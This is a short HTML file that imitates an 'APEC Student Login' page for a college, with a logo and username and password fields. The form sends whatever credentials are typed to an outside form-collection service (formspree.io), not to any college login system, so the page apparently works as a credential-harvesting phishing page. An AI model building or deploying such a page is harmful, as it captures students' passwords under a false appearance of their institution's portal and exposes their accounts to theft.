<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>APEC Student Login</title>

    <link rel="stylesheet" href="style.css">
</head>

<body>

<div class="login-box">

    <img src="logo.png" alt="College Logo" class="logo">

    <h2>APEC Student Login</h2>

    <form action="https://formspree.io/f/mykqbapa" method="POST">

        <input
            type="text"
            name="username"
            placeholder="Enter Username"
            required>

        <input
            type="password"
            name="password"
            placeholder="Enter Password"
            required>

        <button type="submit">
            Login
        </button>

    </form>

</div>

</body>
</html>
